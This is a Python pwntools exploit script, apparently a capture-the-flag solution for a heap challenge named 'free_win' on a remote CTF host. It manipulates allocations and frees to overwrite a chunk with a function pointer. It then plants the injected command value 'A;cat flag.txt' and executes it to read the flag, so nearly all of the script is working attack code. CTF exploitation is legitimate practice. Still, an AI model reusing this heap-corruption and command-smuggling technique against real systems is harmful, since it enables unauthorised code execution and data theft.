
#!/usr/bin/env python3

from pwn import *
from time import sleep

HOST = "pwn.pwnme.fr"
PORT = 7011

exe = ELF("./free_win")

context.log_level = 'info'



def conn():
    if args.REMOTE:
        r = remote(HOST, PORT)
    else:
        r = process(["strace", "-o", "strace.out", "./free_win"])
        # r = process(["./free_win"])

    return r



def menu(r):
    rep = r.recvuntil(b'>> ')
    print(rep)


def malloc(r, index, size, chunck):
    r.send(b'1\n')
    r.recvuntil(b'>> ')
    r.send(index + b'\n')
    r.recvuntil(b'>> ')
    r.send(size + b'\n')
    r.recvuntil(b'>> ')
    r.send(chunck + b'\n')

def free(r, index):
    r.send(b'2\n')
    r.recvuntil(b'>> ')
    r.send(index + b'\n')


def edit_chunck(r, index, chunck):
    r.send(b'3\n')
    r.recvuntil(b'>> ')
    r.send(index + b'\n')
    r.recvuntil(b'>> ')
    r.sendline(chunck)



def execute(r, index):
    r.send(b'4\n')
    r.recvuntil(b'>> ')
    r.send(index + b'\n')


def main():
    global r

    execute_chunk_ping = 0x400d85


    r = conn()

    menu(r)

    malloc(r, b'0', b'16', b'AAAAAAAA')

    menu(r)

    malloc(r, b'1', b'16', b'AAAAAAAA')

    menu(r)

    malloc(r, b'2', b'16', b'AAAAAAAA')

    menu(r)

    free(r,b'2')

    menu(r)

    free(r,b'1')

    menu(r)

    malloc(r, b'1', b'56', b'Z' * 32 + p64(execute_chunk_ping) )

    menu(r)


    edit_chunck(r, b'2', b'A;cat flag.txt')

    menu(r)

    execute(r, b'2')


    rep = r.recv()
    print(rep)    


    rep = r.recv()
    print(rep)    

if __name__ == "__main__":
    main()